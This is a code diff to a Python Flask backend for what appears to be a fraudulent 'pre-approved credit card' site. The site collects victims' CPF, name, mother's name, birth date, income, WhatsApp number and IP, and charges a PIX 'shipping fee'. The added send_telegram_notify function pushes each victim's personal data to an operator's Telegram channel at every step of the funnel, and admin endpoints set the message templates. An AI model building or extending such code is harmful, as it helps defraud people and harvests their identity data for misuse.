@@ -320,46 +320,88 @@ def validate_cpf(cpf: str) -> bool:
     return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])
 
 
-def send_telegram_report(session_id, is_paid=False):
-    db = get_db()
-    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
-    if not row or not row["value"]: return
-    channel = row["value"]
-    
-    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
-    if not lead: return
-    
-    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
-    
-    bot_token = os.environ.get("BOT_TOKEN")
-    if not bot_token: return
-    
-    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
-    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
-        status_icon = "✅ PAGO"
-        
-    texto = (
-        f"📊 *RELATÓRIO FINAL DE LEAD*\n\n"
-        f"👤 *Nome:* {lead['nome']}\n"
-        f"💳 *CPF:* {lead['cpf']}\n"
-        f"💰 *Renda Declarada:* {lead['renda']}\n"
-        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\n"
-        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\n"
-        f"🚚 *Status PIX:* {status_icon}\n"
-    )
-    if pay:
-        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\n"
-        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\n"
-
+def send_telegram_notify(session_id, event_type="ENTRY"):
     try:
-        import requests
-        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
-            "chat_id": channel,
+        db = get_db()
+        row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
+        row_channel = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
+        row_topic = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
+
+        bot_token = row_token["value"] if row_token else os.environ.get("BOT_TOKEN")
+        channel_id = row_channel["value"] if row_channel else None
+        topic_id = row_topic["value"] if row_topic else None
+
+        if not bot_token or not channel_id: return
+
+        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
+        if not lead: return
+        
+        pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
+        
+        icons = {
+            "ENTRY": "🟢",
+            "CARD_CHOSEN": "💳",
+            "PIX_GENERATED": "⏳",
+            "PIX_PAID": "✅",
+            "INFO_ADDED": "📝"
+        }
+        icon = icons.get(event_type, "ℹ️")
+        
+        # Load templates from DB
+        tpl_row = db.execute(f"SELECT value FROM sys_config WHERE key='tg_tpl_{event_type.lower()}'").fetchone()
+        
+        if tpl_row and tpl_row["value"]:
+            texto = tpl_row["value"]
+            # Replace tags
+            texto = texto.replace("{nome}", str(lead["nome"] or "-"))
+            texto = texto.replace("{cpf}", str(lead["cpf"] or "-"))
+            texto = texto.replace("{whatsapp}", str(lead["whatsapp"] or "-"))
+            texto = texto.replace("{ip}", str(lead["ip"] or "-"))
+            texto = texto.replace("{limite}", str(lead["limite_aprovado"] or "-"))
+            texto = texto.replace("{renda}", str(lead["renda"] or "-"))
+            texto = texto.replace("{cartao}", f"{lead['card_style']} ({lead['card_color']})")
+            texto = texto.replace("{status}", str(lead["pix_status"]))
+            texto = texto.replace("{frete}", str(pay["amount"]) if pay else "-")
+            texto = texto.replace("{icon}", icon)
+            texto = texto.replace("{event}", event_type)
+        else:
+            # Default spreadsheet-like formatting
+            status_text = "PAGO" if event_type == "PIX_PAID" else ("AGUARDANDO" if event_type == "PIX_GENERATED" else event_type)
+            texto = (
+                f"{icon} *NOVO EVENTO: {event_type}* {icon}\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 *Nome:* `{lead['nome'] or '-'}`\n"
+                f"🪪 *CPF:* `{lead['cpf'] or '-'}`\n"
+                f"📱 *WhatsApp:* `{lead['whatsapp'] or '-'}`\n"
+                f"🌍 *IP:* `{lead['ip'] or '-'}`\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"💰 *Renda:* `R$ {lead['renda'] or '-'}`\n"
+                f"🎯 *Limite:* `R$ {lead['limite_aprovado'] or '-'}`\n"
+                f"💳 *Cartão:* `{lead['card_style']} ({lead['card_color']})`\n"
+            )
+            if pay:
+                texto += f"📦 *Frete:* `R$ {pay['amount']}`\n"
+                texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\n"
+            
+            texto += f"🚦 *Status Atual:* `{status_text}`\n"
+
+        payload = {
+            "chat_id": channel_id,
             "text": texto,
             "parse_mode": "Markdown"
-        }, timeout=5)
+        }
+        if topic_id:
+            payload["message_thread_id"] = topic_id
+            
+        import requests
+        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
     except Exception as e:
-        log.error(f"Erro ao enviar relatorio: {e}")
+        import logging
+        logging.error(f"Telegram Notify Error: {e}")
+
+# Fallback for old calls
+def send_telegram_report(session_id, is_paid=False):
+    send_telegram_notify(session_id, 'PIX_PAID' if is_paid else 'PIX_GENERATED')
 
 def format_cpf(cpf: str) -> str:
     cpf = re.sub(r"\D", "", cpf)
@@ -763,6 +805,8 @@ def api_lead():
         """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
               utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc))
     db.commit()
+    import threading
+    threading.Thread(target=send_telegram_notify, args=(sid, "ENTRY")).start()
 
     return jsonify({
         "ok":            True,
@@ -788,6 +832,8 @@ def api_card_style():
         (color, style, sid)
     )
     db.commit()
+    import threading
+    threading.Thread(target=send_telegram_notify, args=(sid, "CARD_CHOSEN")).start()
     return jsonify({"ok": True})
 
 
@@ -806,6 +852,8 @@ def api_whatsapp():
     db = get_db()
     db.execute("UPDATE leads SET whatsapp=?, updated_at=unixepoch() WHERE session_id=?", (wa, sid))
     db.commit()
+    import threading
+    threading.Thread(target=send_telegram_notify, args=(sid, "INFO_ADDED")).start()
 
     mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
     if mgr:
@@ -1524,7 +1572,9 @@ def admin_api_logo():
 @app.route("/api/admin/bot-config", methods=["GET"])
 def api_admin_bot_config_get():
     db = get_db()
-    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('telegram_token', 'tg_log_channel', 'tg_log_thread_id')").fetchall()
+    keys = ['telegram_token', 'tg_log_channel', 'tg_log_thread_id', 'tg_tpl_entry', 'tg_tpl_card_chosen', 'tg_tpl_pix_generated', 'tg_tpl_pix_paid']
+    placeholders = ','.join(['?']*len(keys))
+    rows = db.execute(f"SELECT key, value FROM sys_config WHERE key IN ({placeholders})", keys).fetchall()
     cfg = {r["key"]: r["value"] for r in rows}
     return jsonify(cfg)
 
@@ -1532,9 +1582,10 @@ def api_admin_bot_config_get():
 def api_admin_bot_config():
     data = request.get_json()
     db = get_db()
-    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('telegram_token', ?)", (data.get('token', ''),))
-    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (data.get('channel', ''),))
-    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_thread_id', ?)", (data.get('topic', ''),))
+    for key in ['token', 'channel', 'topic', 'tpl_entry', 'tpl_card_chosen', 'tpl_pix_generated', 'tpl_pix_paid']:
+        if key in data:
+            db_key = 'telegram_token' if key == 'token' else ('tg_log_channel' if key == 'channel' else ('tg_log_thread_id' if key == 'topic' else f'tg_{key}'))
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (db_key, data.get(key, '')))
     db.commit()
     return jsonify({"ok": True})
 
